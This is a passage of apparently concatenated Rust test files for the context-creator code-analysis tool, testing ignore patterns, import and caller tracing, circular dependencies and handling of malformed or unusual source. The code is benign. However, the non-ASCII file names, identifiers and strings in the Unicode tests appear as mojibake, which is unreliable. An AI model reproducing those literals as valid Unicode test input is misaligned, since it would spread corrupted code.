            "app.test.js",
            r#"
describe('App', () => {
    it('should work', () => {
        expect(true).toBe(true);
    });
});
"#,
        )
        // Vendor directory that should be ignored
        .add_file(
            "vendor/external.rs",
            r#"
pub fn vendor_function() {
    println!("Should be ignored");
}
"#,
        )
        // Internal module that should be included
        .add_file(
            "internal.rs",
            r#"
pub fn helper() {
    println!("Internal helper");
}
"#,
        )
        .build();

    // Create config with semantic analysis enabled
    let config = Config {
        paths: Some(vec![root.to_path_buf()]),
        trace_imports: true,
        include_callers: true,
        include_types: true,
        semantic_depth: 3,
        ..Config::default()
    };

    let walk_options = WalkOptions::from_config(&config).unwrap();
    let cache = Arc::new(FileCache::new());

    // Walk directory - this should respect .context-creator-ignore
    let mut files = walk_directory(&root, walk_options).unwrap();

    // Verify that ignored files are not in the file list
    assert!(
        find_file(&files, "secrets.rs").is_none(),
        "secrets.rs should be ignored by .context-creator-ignore"
    );
    assert!(
        find_file(&files, "lib_test.rs").is_none(),
        "lib_test.rs should be ignored by pattern *_test.rs"
    );
    assert!(
        find_file(&files, "test_utils.rs").is_none(),
        "test_utils.rs should be ignored by pattern test_*.rs"
    );
    assert!(
        find_file(&files, "app.test.js").is_none(),
        "app.test.js should be ignored by pattern *.test.js"
    );
    assert!(
        !files
            .iter()
            .any(|f| f.relative_path.to_string_lossy().contains("vendor/")),
        "vendor/ directory should be ignored"
    );

    // Verify that non-ignored files are present
    assert!(
        find_file(&files, "main.rs").is_some(),
        "main.rs should be included"
    );
    assert!(
        find_file(&files, "lib.rs").is_some(),
        "lib.rs should be included"
    );
    assert!(
        find_file(&files, "utils.rs").is_some(),
        "utils.rs should be included"
    );
    assert!(
        find_file(&files, "internal.rs").is_some(),
        "internal.rs should be included"
    );

    // Perform semantic analysis
    context_creator::core::walker::perform_semantic_analysis(&mut files, &config, &cache).unwrap();

    // Check that imports to ignored files are not resolved
    let main_file = find_file(&files, "main.rs").expect("main.rs should be found");
    let lib_file = find_file(&files, "lib.rs").expect("lib.rs should be found");

    // main.rs imports lib and utils (not secrets)
    let main_imports: Vec<String> = main_file
        .imports
        .iter()
        .filter_map(|p| p.file_name())
        .filter_map(|n| n.to_str())
        .map(|s| s.to_string())
        .collect();

    assert!(
        main_imports.contains(&"lib.rs".to_string()),
        "Should import lib.rs"
    );
    assert!(
        main_imports.contains(&"utils.rs".to_string()),
        "Should import utils.rs"
    );
    assert!(
        !main_imports.contains(&"secrets.rs".to_string()),
        "Should not import ignored secrets.rs"
    );

    // lib.rs imports internal (not test_helpers)
    let lib_imports: Vec<String> = lib_file
        .imports
        .iter()
        .filter_map(|p| p.file_name())
        .filter_map(|n| n.to_str())
        .map(|s| s.to_string())
        .collect();

    assert!(
        lib_imports.contains(&"internal.rs".to_string()),
        "Should import internal.rs"
    );
    assert!(
        !lib_imports.contains(&"test_helpers.rs".to_string()),
        "Should not import ignored test_helpers.rs"
    );

    // Verify that only included files participate in bidirectional relationships
    let internal_file = find_file(&files, "internal.rs").expect("internal.rs should be found");
    assert_imported_by(internal_file, &["lib.rs"]);
}
```

## tests/semantic_comprehensive_test.rs

Imports: context_creator::cli::Config, context_creator::core::cache::FileCache, context_creator, std::fs, std::sync::Arc, tempfile::TempDir, config

Type references: context_creator::cli::Config.Config, context_creator::core::cache::FileCache.FileCache, fs, tempfile::TempDir.TempDir, context_creator.FileInfo, context_creator.FileInfo, context_creator::cli::Config.Config, context_creator::cli::Config.Config, context_creator::cli::Config.Config

```rust
//! Comprehensive semantic analysis integration tests

use context_creator::cli::Config;
use context_creator::core::cache::FileCache;
use context_creator::core::walker::{walk_directory, FileInfo, WalkOptions};
use std::fs;
use std::sync::Arc;
use tempfile::TempDir;

// Helper to find files cross-platform
fn find_file<'a>(files: &'a [FileInfo], path_parts: &[&str]) -> Option<&'a FileInfo> {
    files.iter().find(|f| {
        let path_str = f.relative_path.to_str().unwrap();
        let expected_unix = path_parts.join("/");
        let expected_windows = path_parts.join("\\");
        path_str == expected_unix || path_str == expected_windows
    })
}

#[test]
fn test_multi_language_project_semantic_analysis() {
    let temp_dir = TempDir::new().unwrap();
    let root = temp_dir.path();

    // Create a multi-language project structure
    // Python module
    fs::create_dir(root.join("python")).unwrap();
    fs::write(
        root.join("python/main.py"),
        r#"
import os
import utils
import models

def main():
    user = models.User("Alice")
    result = utils.process(user)
    print(f"Hello, {result}")
"#,
    )
    .unwrap();

    fs::write(
        root.join("python/utils.py"),
        r#"
def process(obj):
    return obj.name.upper()
"#,
    )
    .unwrap();

    fs::write(
        root.join("python/models.py"),
        r#"
class User:
    def __init__(self, name):
        self.name = name
"#,
    )
    .unwrap();

    // JavaScript module
    fs::create_dir(root.join("js")).unwrap();
    fs::write(
        root.join("js/index.js"),
        r#"
import { fetchUser } from './api';
import { formatName } from './utils';

async function main() {
    const user = await fetchUser(123);
    console.log(formatName(user.name));
}

main();
"#,
    )
    .unwrap();

    fs::write(
        root.join("js/api.js"),
        r#"
export async function fetchUser(id) {
    return { id, name: 'Bob' };
}
"#,
    )
    .unwrap();

    fs::write(
        root.join("js/utils.js"),
        r#"
export function formatName(name) {
    return name.toUpperCase();
}
"#,
    )
    .unwrap();

    // Rust module
    fs::create_dir(root.join("rust")).unwrap();
    fs::write(
        root.join("rust/main.rs"),
        r#"
mod lib;
mod utils;

use crate::utils::process_name;

fn main() {
    let name = "Charlie";
    let processed = process_name(name);
    lib::greet(&processed);
}
"#,
    )
    .unwrap();

    fs::write(
        root.join("rust/lib.rs"),
        r#"
pub fn greet(name: &str) {
    println!("Hello, {}!", name);
}
"#,
    )
    .unwrap();

    fs::write(
        root.join("rust/utils.rs"),
        r#"
pub fn process_name(name: &str) -> String {
    name.to_uppercase()
}
"#,
    )
    .unwrap();

    // Create config with semantic analysis enabled
    let config = Config {
        paths: Some(vec![root.to_path_buf()]),
        trace_imports: true,
        include_callers: true,
        include_types: true,
        semantic_depth: 3,
        ..Config::default()
    };

    // Create walk options and cache
    let walk_options = WalkOptions::from_config(&config).unwrap();
    let cache = Arc::new(FileCache::new());

    // Walk directory and get files
    let mut files = walk_directory(root, walk_options).unwrap();

    // Perform semantic analysis
    context_creator::core::walker::perform_semantic_analysis(&mut files, &config, &cache).unwrap();

    // Verify Python imports
    let py_main = find_file(&files, &["python", "main.py"]).expect("Python main.py not found");
    assert!(
        !py_main.imports.is_empty(),
        "Python main should have imports"
    );

    let py_utils = find_file(&files, &["python", "utils.py"]).expect("Python utils.py not found");
    assert!(
        !py_utils.imported_by.is_empty(),
        "Python utils should be imported by main"
    );

    // Verify JavaScript imports
    let js_index = find_file(&files, &["js", "index.js"]).expect("JS index.js not found");
    assert!(!js_index.imports.is_empty(), "JS index should have imports");
    assert!(
        !js_index.function_calls.is_empty(),
        "JS index should have function calls"
    );

    let js_api = find_file(&files, &["js", "api.js"]).expect("JS api.js not found");
    assert!(
        !js_api.imported_by.is_empty(),
        "JS api should be imported by index"
    );

    // Verify Rust imports
    let rs_main = find_file(&files, &["rust", "main.rs"]).expect("Rust main.rs not found");
    assert!(!rs_main.imports.is_empty(), "Rust main should have imports");
    assert!(
        !rs_main.function_calls.is_empty(),
        "Rust main should have function calls"
    );

    let rs_lib = find_file(&files, &["rust", "lib.rs"]).expect("Rust lib.rs not found");
    assert!(
        !rs_lib.imported_by.is_empty(),
        "Rust lib should be imported by main"
    );
}

#[test]
fn test_circular_dependency_detection() {
    let temp_dir = TempDir::new().unwrap();
    let root = temp_dir.path();

    // Create circular dependencies
    fs::write(
        root.join("a.rs"),
        r#"
mod b;
use crate::b::func_b;

pub fn func_a() {
    func_b();
}
"#,
    )
    .unwrap();

    fs::write(
        root.join("b.rs"),
        r#"
mod c;
use crate::c::func_c;

pub fn func_b() {
    func_c();
}
"#,
    )
    .unwrap();

    fs::write(
        root.join("c.rs"),
        r#"
mod a;
use crate::a::func_a;

pub fn func_c() {
    func_a();
}
"#,
    )
    .unwrap();

    // Create config with semantic analysis enabled
    let config = Config {
        paths: Some(vec![root.to_path_buf()]),
        trace_imports: true,
        semantic_depth: 5, // High depth to test cycle detection
        ..Config::default()
    };

    // Create walk options and cache
    let walk_options = WalkOptions::from_config(&config).unwrap();
    let cache = Arc::new(FileCache::new());

    // Walk directory and get files
    let mut files = walk_directory(root, walk_options).unwrap();

    // Perform semantic analysis - should handle cycles gracefully
    context_creator::core::walker::perform_semantic_analysis(&mut files, &config, &cache).unwrap();

    // All files should have been analyzed despite the cycle
    assert_eq!(files.len(), 3);
    for file in &files {
        if file.relative_path.extension().unwrap() == "rs" {
            assert!(
                !file.imports.is_empty() || !file.imported_by.is_empty(),
                "File {:?} should have import relationships",
                file.relative_path
            );
        }
    }
}

#[test]
fn test_semantic_depth_limiting() {
    let temp_dir = TempDir::new().unwrap();
    let root = temp_dir.path();

    // Create a deep dependency chain
    for i in 0..10 {
        let content = if i == 0 {
            r#"
fn main() {
    mod1::func1();
}
"#
            .to_string()
        } else if i < 9 {
            format!(
                r#"
mod mod{};
use crate::mod{}::func{};

pub fn func{}() {{
    func{}();
}}
"#,
                i + 1,
                i + 1,
                i + 1,
                i,
                i + 1
            )
        } else {
            r#"
pub fn func9() {
    println!("End of chain");
}
"#
            .to_string()
        };

        fs::write(root.join(format!("mod{i}.rs")), content).unwrap();
    }

    // Test with shallow depth
    let config = Config {
        paths: Some(vec![root.to_path_buf()]),
        trace_imports: true,
        semantic_depth: 2, // Only analyze 2 levels deep
        ..Config::default()
    };

    let walk_options = WalkOptions::from_config(&config).unwrap();
    let cache = Arc::new(FileCache::new());
    let mut files = walk_directory(root, walk_options).unwrap();

    context_creator::core::walker::perform_semantic_analysis(&mut files, &config, &cache).unwrap();

    // Check that analysis was limited by depth
    // Files beyond depth 2 should have minimal analysis
    let _deep_file = files
        .iter()
        .find(|f| f.relative_path.to_str().unwrap() == "mod5.rs")
        .unwrap();

    // Deep files might not be fully analyzed due to depth limit
    // This is expected behavior
    assert_eq!(files.len(), 10, "All files should be present");
}
```

## tests/semantic_edge_cases_test.rs

Imports: std::fs, tempfile::TempDir

Type references: fs, tempfile::TempDir.TempDir

```rust
//! Edge case tests for semantic analysis in markdown output

use std::fs;
use tempfile::TempDir;

/// Test circular imports are handled correctly
#[test]
fn test_circular_imports_handling() {
    let temp_dir = TempDir::new().unwrap();
    let src_dir = temp_dir.path().join("src");
    fs::create_dir_all(&src_dir).unwrap();

    // Create main.rs that declares the modules
    fs::write(
        src_dir.join("main.rs"),
        r#"
mod a;
mod b;
mod c;

fn main() {
    a::function_a();
}
"#,
    )
    .unwrap();

    // Create circular dependency: a.rs -> b.rs -> c.rs -> a.rs
    fs::write(
        src_dir.join("a.rs"),
        r#"
use crate::b::function_b;

pub fn function_a() {
    function_b();
}
"#,
    )
    .unwrap();

    fs::write(
        src_dir.join("b.rs"),
        r#"
use crate::c::function_c;

pub fn function_b() {
    function_c();
}
"#,
    )
    .unwrap();

    fs::write(
        src_dir.join("c.rs"),
        r#"
use crate::a::function_a;

pub fn function_c() {
    // This creates a circular dependency
    if false {
        function_a();
    }
}
"#,
    )
    .unwrap();

    let output = std::process::Command::new(env!("CARGO_BIN_EXE_context-creator"))
        .arg(&src_dir)
        .arg("--trace-imports")
        .arg("--include-callers")
        .output()
        .expect("Failed to execute context-creator");

    let stdout = String::from_utf8_lossy(&output.stdout);
    let stderr = String::from_utf8_lossy(&output.stderr);

    // Debug output
    eprintln!("STDOUT:\n{stdout}");
    eprintln!("STDERR:\n{stderr}");
    eprintln!("Status: {:?}", output.status);

    // Should handle circular imports without crashing
    assert!(output.status.success(), "Should handle circular imports");

    // Check that main.rs imports the modules
    assert!(stdout.contains("main.rs"));
    assert!(
        stdout.contains("Imports: a, b, c"),
        "main.rs should import a, b, c"
    );

    // Check that modules are imported by main
    assert!(stdout.contains("a.rs") && stdout.contains("Imported by: main.rs"));
    assert!(stdout.contains("b.rs") && stdout.contains("Imported by: main.rs"));
    assert!(stdout.contains("c.rs") && stdout.contains("Imported by: main.rs"));
}

/// Test files with no imports/exports
#[test]
fn test_files_with_no_semantic_info() {
    let temp_dir = TempDir::new().unwrap();
    let src_dir = temp_dir.path().join("src");
    fs::create_dir_all(&src_dir).unwrap();

    // Create files with no imports or function calls
    fs::write(
        src_dir.join("standalone.rs"),
        r#"
// A file with no imports or exports
const VALUE: i32 = 42;

fn internal_function() {
    println!("Internal only");
}
"#,
    )
    .unwrap();

    fs::write(
        src_dir.join("constants.rs"),
        r#"
// Just constants, no functions or imports
pub const MAX_SIZE: usize = 1024;
pub const DEFAULT_NAME: &str = "default";
"#,
    )
    .unwrap();

    let output = std::process::Command::new(env!("CARGO_BIN_EXE_context-creator"))
        .arg(&src_dir)
        .arg("--trace-imports")
        .arg("--include-callers")
        .arg("--include-types")
        .output()
        .expect("Failed to execute context-creator");

    let stdout = String::from_utf8_lossy(&output.stdout);

    // Should not show semantic sections for files without semantic info
    let standalone_section = stdout
        .split("## standalone.rs")
        .nth(1)
        .unwrap_or("")
        .split("##")
        .next()
        .unwrap_or("");

    assert!(!standalone_section.contains("Imports:"));
    assert!(!standalone_section.contains("Imported by:"));
    assert!(!standalone_section.contains("Function calls:"));
}

/// Test files with many imports
#[test]
fn test_file_with_many_imports() {
    let temp_dir = TempDir::new().unwrap();
    let src_dir = temp_dir.path().join("src");
    fs::create_dir_all(&src_dir).unwrap();

    // Create a file with many imports
    fs::write(
        src_dir.join("main.rs"),
        r#"
use std::collections::HashMap;
use std::io::{Read, Write};
use std::path::{Path, PathBuf};

mod utils;
mod helpers;
mod config;
mod database;
mod api;

use utils::process;
use helpers::{format_output, validate_input};
use config::Settings;
use database::Connection;
use api::{Client, Response};

fn main() {
    process();
    format_output("test");
    validate_input("data");
}
"#,
    )
    .unwrap();

    // Create the imported modules
    for module in &["utils", "helpers", "config", "database", "api"] {
        fs::write(
            src_dir.join(format!("{module}.rs")),
            format!(
                r#"
pub fn {}() {{
    println!("{} module");
}}
"#,
                if module == &"utils" {
                    "process"
                } else {
                    "function"
                },
                module
            ),
        )
        .unwrap();
    }

    let output = std::process::Command::new(env!("CARGO_BIN_EXE_context-creator"))
        .arg(&src_dir)
        .arg("--trace-imports")
        .arg("--include-callers")
        .output()
        .expect("Failed to execute context-creator");

    let stdout = String::from_utf8_lossy(&output.stdout);

    // Should show multiple imports
    assert!(stdout.contains("main.rs"));
    assert!(
        stdout.contains("Imports:") && stdout.contains("utils, helpers, config, database, api")
    );

    // Each module should show it's imported by main
    assert!(stdout.contains("utils.rs") && stdout.contains("Imported by: main.rs"));
    assert!(stdout.contains("helpers.rs") && stdout.contains("Imported by: main.rs"));
}

/// Test deeply nested module structure
#[test]
fn test_deeply_nested_modules() {
    let temp_dir = TempDir::new().unwrap();
    let src_dir = temp_dir.path().join("src");

    // Create nested directory structure
    let deep_path = src_dir.join("core").join("semantic").join("analyzer");
    fs::create_dir_all(&deep_path).unwrap();

    fs::write(
        src_dir.join("main.rs"),
        r#"
mod core;
use core::semantic::analyzer::analyze;

fn main() {
    analyze();
}
"#,
    )
    .unwrap();

    fs::write(
        src_dir.join("core").join("mod.rs"),
        r#"
pub mod semantic;
"#,
    )
    .unwrap();

    fs::write(
        src_dir.join("core").join("semantic").join("mod.rs"),
        r#"
pub mod analyzer;
"#,
    )
    .unwrap();

    fs::write(
        deep_path.join("mod.rs"),
        r#"
pub fn analyze() {
    println!("Analyzing...");
}
"#,
    )
    .unwrap();

    let output = std::process::Command::new(env!("CARGO_BIN_EXE_context-creator"))
        .arg(&src_dir)
        .arg("--trace-imports")
        .output()
        .expect("Failed to execute context-creator");

    let stdout = String::from_utf8_lossy(&output.stdout);

    // Should handle nested module imports
    assert!(output.status.success());
    assert!(stdout.contains("main.rs"));
    // The semantic analyzer should track the deep import chain
}

/// Test file with same name in different directories
#[test]
fn test_same_filename_different_dirs() {
    let temp_dir = TempDir::new().unwrap();
    let src_dir = temp_dir.path().join("src");
    let tests_dir = temp_dir.path().join("tests");
    fs::create_dir_all(&src_dir).unwrap();
    fs::create_dir_all(&tests_dir).unwrap();

    // Create lib.rs in both directories
    fs::write(
        src_dir.join("lib.rs"),
        r#"
pub fn library_function() {
    println!("Source library");
}
"#,
    )
    .unwrap();

    fs::write(
        tests_dir.join("lib.rs"),
        r#"
// Test library that imports the main library
use crate::library_function;

#[test]
fn test_library() {
    library_function();
}
"#,
    )
    .unwrap();

    let output = std::process::Command::new(env!("CARGO_BIN_EXE_context-creator"))
        .arg(temp_dir.path())
        .arg("--trace-imports")
        .output()
        .expect("Failed to execute context-creator");

    let stdout = String::from_utf8_lossy(&output.stdout);

    // Should distinguish between files with same name
    assert!(stdout.contains("src/lib.rs") || stdout.contains("src\\lib.rs"));
    assert!(stdout.contains("tests/lib.rs") || stdout.contains("tests\\lib.rs"));
}

/// Test with type references edge cases
#[test]
fn test_complex_type_references() {
    let temp_dir = TempDir::new().unwrap();
    let src_dir = temp_dir.path().join("src");
    fs::create_dir_all(&src_dir).unwrap();

    fs::write(
        src_dir.join("types.rs"),
        r#"
use std::collections::{HashMap, HashSet, BTreeMap};
use std::sync::{Arc, Mutex, RwLock};

pub type StringMap = HashMap<String, String>;
pub type ThreadSafeCounter = Arc<Mutex<i32>>;
pub type ConcurrentSet<T> = Arc<RwLock<HashSet<T>>>;

pub struct ComplexType<T, U> 
where 
    T: Clone + Send,
    U: Default
{
    data: HashMap<T, Vec<U>>,
    cache: BTreeMap<String, T>,
}

impl<T: Clone + Send, U: Default> ComplexType<T, U> {
    pub fn new() -> Self {
        Self {
            data: HashMap::new(),
            cache: BTreeMap::new(),
        }
    }
}
"#,
    )
    .unwrap();

    let output = std::process::Command::new(env!("CARGO_BIN_EXE_context-creator"))
        .arg(&src_dir)
        .arg("--include-types")
        .output()
        .expect("Failed to execute context-creator");

    let stdout = String::from_utf8_lossy(&output.stdout);

    // Should track type references
    assert!(output.status.success());
    if stdout.contains("Type references:") {
        // Should include standard library types used
        assert!(stdout.contains("HashMap") || stdout.contains("HashSet"));
    }
}

/// Test with function calls including method calls
#[test]
fn test_various_function_call_patterns() {
    let temp_dir = TempDir::new().unwrap();
    let src_dir = temp_dir.path().join("src");
    fs::create_dir_all(&src_dir).unwrap();

    fs::write(
        src_dir.join("calls.rs"),
        r#"
use std::fs;
use std::path::Path;

mod utils;
use utils::{helper, process_data};

fn main() {
    // Direct function calls
    helper();
    process_data("input");
    
    // Method calls
    let path = Path::new("test.txt");
    path.exists();
    path.is_file();
    
    // Associated function calls
    fs::read_to_string("file.txt").unwrap();
    String::from("hello");
    
    // Chained calls
    vec![1, 2, 3]
        .iter()
        .map(|x| x * 2)
        .filter(|x| x > &2)
        .collect::<Vec<_>>();
    
    // Closure calls
    let closure = |x| x + 1;
    closure(5);
    
    // Macro calls (might not be tracked)
    println!("Hello");
    vec![1, 2, 3];
}
"#,
    )
    .unwrap();

    fs::write(
        src_dir.join("utils.rs"),
        r#"
pub fn helper() {
    println!("Helper");
}

pub fn process_data(input: &str) {
    println!("Processing: {}", input);
}
"#,
    )
    .unwrap();

    let output = std::process::Command::new(env!("CARGO_BIN_EXE_context-creator"))
        .arg(&src_dir)
        .arg("--include-callers")
        .output()
        .expect("Failed to execute context-creator");

    let stdout = String::from_utf8_lossy(&output.stdout);

    // Should track various function call patterns
    assert!(output.status.success());
    if stdout.contains("Function calls:") {
        // Should at least track direct function calls
        assert!(stdout.contains("helper()") || stdout.contains("process_data()"));
    }
}

/// Test empty directory
#[test]
fn test_empty_directory() {
    let temp_dir = TempDir::new().unwrap();
    let empty_dir = temp_dir.path().join("empty");
    fs::create_dir_all(&empty_dir).unwrap();

    let output = std::process::Command::new(env!("CARGO_BIN_EXE_context-creator"))
        .arg(&empty_dir)
        .arg("--trace-imports")
        .arg("--include-callers")
        .arg("--include-types")
        .output()
        .expect("Failed to execute context-creator");

    // Should handle empty directory gracefully
    assert!(output.status.success());
    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(stdout.contains("Total files: 0"));
}

/// Test with invalid UTF-8 in file names (if supported by OS)
#[test]
#[cfg(unix)]
fn test_non_utf8_filenames() {
    let temp_dir = TempDir::new().unwrap();
    let src_dir = temp_dir.path().join("src");
    fs::create_dir_all(&src_dir).unwrap();

    // Create a file with valid UTF-8 content but potentially problematic name
    fs::write(
        src_dir.join("Ñ„Ð°Ð¹Ð».rs"), // Cyrillic characters
        r#"
pub fn function() {
    println!("Non-ASCII filename");
}
"#,
    )
    .unwrap();

    let output = std::process::Command::new(env!("CARGO_BIN_EXE_context-creator"))
        .arg(&src_dir)
        .arg("--trace-imports")
        .output()
        .expect("Failed to execute context-creator");

    // Should handle non-ASCII filenames
    assert!(output.status.success());
}

/// Test files that import from parent directories
#[test]
fn test_parent_directory_imports() {
    let temp_dir = TempDir::new().unwrap();
    let src_dir = temp_dir.path().join("src");
    let sub_dir = src_dir.join("submodule");
    fs::create_dir_all(&sub_dir).unwrap();

    fs::write(
        src_dir.join("lib.rs"),
        r#"
pub mod submodule;

pub fn parent_function() {
    println!("Parent");
}
"#,
    )
    .unwrap();

    fs::write(
        sub_dir.join("mod.rs"),
        r#"
use super::parent_function;

pub fn child_function() {
    parent_function();
}
"#,
    )
    .unwrap();

    let output = std::process::Command::new(env!("CARGO_BIN_EXE_context-creator"))
        .arg(&src_dir)
        .arg("--trace-imports")
        .arg("--include-callers")
        .output()
        .expect("Failed to execute context-creator");

    let stdout = String::from_utf8_lossy(&output.stdout);

    // Should track imports from parent modules
    assert!(output.status.success());
    assert!(stdout.contains("submodule/mod.rs") || stdout.contains("submodule\\mod.rs"));
}

/// Test with external crate imports (won't be tracked but shouldn't crash)
#[test]
fn test_external_crate_imports() {
    let temp_dir = TempDir::new().unwrap();
    let src_dir = temp_dir.path().join("src");
    fs::create_dir_all(&src_dir).unwrap();

    fs::write(
        src_dir.join("external.rs"),
        r#"
// These external crates won't be in our codebase
use serde::{Serialize, Deserialize};
use tokio::runtime::Runtime;
use anyhow::{Result, Context};

#[derive(Serialize, Deserialize)]
pub struct Config {
    name: String,
    value: i32,
}

pub async fn async_function() -> Result<()> {
    Ok(())
}
"#,
    )
    .unwrap();

    let output = std::process::Command::new(env!("CARGO_BIN_EXE_context-creator"))
        .arg(&src_dir)
        .arg("--trace-imports")
        .arg("--include-types")
        .output()
        .expect("Failed to execute context-creator");

    // Should not crash on external imports
    assert!(output.status.success());
}

/// Test very long import lists
#[test]
fn test_very_long_import_list() {
    let temp_dir = TempDir::new().unwrap();
    let src_dir = temp_dir.path().join("src");
    fs::create_dir_all(&src_dir).unwrap();

    // Create many modules
    let module_count = 50;
    let mut imports = String::new();
    let mut import_list = Vec::new();

    for i in 0..module_count {
        let module_name = format!("module_{i}");
        imports.push_str(&format!("mod {module_name};\n"));
        imports.push_str(&format!("use {module_name}::function_{i};\n"));
        import_list.push(module_name.clone());

        fs::write(
            src_dir.join(format!("{module_name}.rs")),
            format!(
                r#"
pub fn function_{i}() {{
    println!("Function {{i}}", {i});
}}
"#
            ),
        )
        .unwrap();
    }

    fs::write(
        src_dir.join("main.rs"),
        format!(
            r#"
{}

fn main() {{
    // Call all functions
    {}
}}
"#,
            imports,
            (0..module_count)
                .map(|i| format!("function_{i}();"))
                .collect::<Vec<_>>()
                .join("\n    ")
        ),
    )
    .unwrap();

    let output = std::process::Command::new(env!("CARGO_BIN_EXE_context-creator"))
        .arg(&src_dir)
        .arg("--trace-imports")
        .output()
        .expect("Failed to execute context-creator");

    let stdout = String::from_utf8_lossy(&output.stdout);

    // Should handle long import lists
    assert!(output.status.success());
    assert!(stdout.contains("main.rs"));
    assert!(stdout.contains("Imports:"));

    // The import list should be reasonably formatted
    let expected_imports = import_list.join(", ");
    assert!(stdout.contains(&expected_imports) || stdout.contains(&import_list[0]));
}
```

## tests/semantic_error_cases_test.rs

Imports: std::fs, tempfile::TempDir

Type references: fs, tempfile::TempDir.TempDir, _

```rust
//! Error case tests for semantic analysis - handling malformed code and edge cases

use std::fs;
use tempfile::TempDir;

/// Test with syntax errors in files
#[test]
fn test_files_with_syntax_errors() {
    let temp_dir = TempDir::new().unwrap();
    let src_dir = temp_dir.path().join("src");
    fs::create_dir_all(&src_dir).unwrap();

    // Create files with various syntax errors
    fs::write(
        src_dir.join("broken.rs"),
        r#"
// Missing closing brace
fn broken_function() {
    println!("This function never closes");
    
use some::module; // use statement in wrong place
"#,
    )
    .unwrap();

    fs::write(
        src_dir.join("incomplete.rs"),
        r#"
mod utils;
use utils::{helper,}; // trailing comma

fn main() {
    helper(; // syntax error
}
"#,
    )
    .unwrap();

    let output = std::process::Command::new(env!("CARGO_BIN_EXE_context-creator"))
        .arg(&src_dir)
        .arg("--trace-imports")
        .arg("--include-callers")
        .output()
        .expect("Failed to execute context-creator");

    // Should not crash on syntax errors
    assert!(
        output.status.success(),
        "Should handle syntax errors gracefully"
    );

    let stdout = String::from_utf8_lossy(&output.stdout);
    // Files should still be included even with syntax errors
    assert!(stdout.contains("broken.rs"));
    assert!(stdout.contains("incomplete.rs"));
}

/// Test with files containing only comments
#[test]
fn test_comment_only_files() {
    let temp_dir = TempDir::new().unwrap();
    let src_dir = temp_dir.path().join("src");
    fs::create_dir_all(&src_dir).unwrap();

    fs::write(
        src_dir.join("comments.rs"),
        r#"
// This file contains only comments
// No actual code here
/* 
   Multi-line comment
   Still no code
*/

/// Documentation comment
/// But no actual items

// The end
"#,
    )
    .unwrap();

    fs::write(
        src_dir.join("todo.rs"),
        r#"
// TODO: Implement this module
// FIXME: Add proper error handling
// NOTE: This is a placeholder file
"#,
    )
    .unwrap();

    let output = std::process::Command::new(env!("CARGO_BIN_EXE_context-creator"))
        .arg(&src_dir)
        .arg("--trace-imports")
        .output()
        .expect("Failed to execute context-creator");

    let stdout = String::from_utf8_lossy(&output.stdout);

    // Should handle comment-only files
    assert!(output.status.success());
    assert!(stdout.contains("comments.rs"));
    assert!(stdout.contains("todo.rs"));

    // Should not show any semantic info for comment-only files
    let comments_section = stdout
        .split("## comments.rs")
        .nth(1)
        .unwrap_or("")
        .split("##")
        .next()
        .unwrap_or("");

    assert!(!comments_section.contains("Imports:"));
    assert!(!comments_section.contains("Function calls:"));
}

/// Test with macro-heavy code
#[test]
fn test_macro_heavy_code() {
    let temp_dir = TempDir::new().unwrap();
    let src_dir = temp_dir.path().join("src");
    fs::create_dir_all(&src_dir).unwrap();

    fs::write(
        src_dir.join("macros.rs"),
        r#"
macro_rules! create_functions {
    ($($name:ident),*) => {
        $(
            pub fn $name() {
                println!(stringify!($name));
            }
        )*
    };
}

create_functions!(foo, bar, baz);

#[derive(Debug, Clone)]
pub struct Generated;

// Procedural macro usage
#[cfg(feature = "serde")]
#[derive(Serialize, Deserialize)]
pub struct Config {
    value: String,
}

fn main() {
    foo(); // This is generated by macro
    println!("Hello"); // Regular macro call
    vec![1, 2, 3]; // Another macro
}
"#,
    )
    .unwrap();

    let output = std::process::Command::new(env!("CARGO_BIN_EXE_context-creator"))
        .arg(&src_dir)
        .arg("--trace-imports")
        .arg("--include-callers")
        .output()
        .expect("Failed to execute context-creator");

    // Should handle macro-heavy code
    assert!(output.status.success());

    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(stdout.contains("macros.rs"));
}

/// Test with extremely long lines
#[test]
fn test_very_long_lines() {
    let temp_dir = TempDir::new().unwrap();
    let src_dir = temp_dir.path().join("src");
    fs::create_dir_all(&src_dir).unwrap();

    // Create a file with very long lines
    let long_import_list = (0..100)
        .map(|i| format!("item_{i}"))
        .collect::<Vec<_>>()
        .join(", ");

    fs::write(
        src_dir.join("long_lines.rs"),
        format!(
            r#"
use some::module::{{{}}};

fn function_with_many_params({}) {{
    println!("Many parameters");
}}

const VERY_LONG_STRING: &str = "{}";
"#,
            long_import_list,
            (0..50)
                .map(|i| format!("param_{i}: i32"))
                .collect::<Vec<_>>()
                .join(", "),
            "A".repeat(1000)
        ),
    )
    .unwrap();

    let output = std::process::Command::new(env!("CARGO_BIN_EXE_context-creator"))
        .arg(&src_dir)
        .arg("--trace-imports")
        .output()
        .expect("Failed to execute context-creator");

    // Should handle very long lines
    assert!(output.status.success());
}

/// Test with Unicode identifiers and strings
#[test]
fn test_unicode_content() {
    let temp_dir = TempDir::new().unwrap();
    let src_dir = temp_dir.path().join("src");
    fs::create_dir_all(&src_dir).unwrap();

    fs::write(
        src_dir.join("unicode.rs"),
        r#"
// Unicode identifiers (allowed in Rust)
pub fn ä½ å¥½() {
    println!("Hello in Chinese");
}

pub fn Ð·Ð´Ñ€Ð°Ð²ÑÑ‚Ð²ÑƒÐ¹Ñ‚Ðµ() {
    println!("Hello in Russian");
}

fn main() {
    let Ï€ = 3.14159;
    let æ–‡å­—åˆ— = "Japanese string";
    
    ä½ å¥½();
    Ð·Ð´Ñ€Ð°Ð²ÑÑ‚Ð²ÑƒÐ¹Ñ‚Ðµ();
    
    // Emoji in strings
    println!("ðŸ¦€ Rust is awesome! ðŸŽ‰");
    
    // Unicode in comments
    // â†’ â† â†‘ â†“ â‡’ â‡ â‡‘ â‡“
}
"#,
    )
    .unwrap();

    let output = std::process::Command::new(env!("CARGO_BIN_EXE_context-creator"))
        .arg(&src_dir)
        .arg("--trace-imports")
        .arg("--include-callers")
        .output()
        .expect("Failed to execute context-creator");

    // Should handle Unicode content
    assert!(output.status.success());

    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(stdout.contains("unicode.rs"));

    // Should track Unicode function calls
    if stdout.contains("Function calls:") {
        // The function names should be preserved
        assert!(stdout.contains("ä½ å¥½()") || stdout.contains("Ð·Ð´Ñ€Ð°Ð²ÑÑ‚Ð²ÑƒÐ¹Ñ‚Ðµ()"));
    }
}

/// Test with conditional compilation
#[test]
fn test_conditional_compilation() {
    let temp_dir = TempDir::new().unwrap();
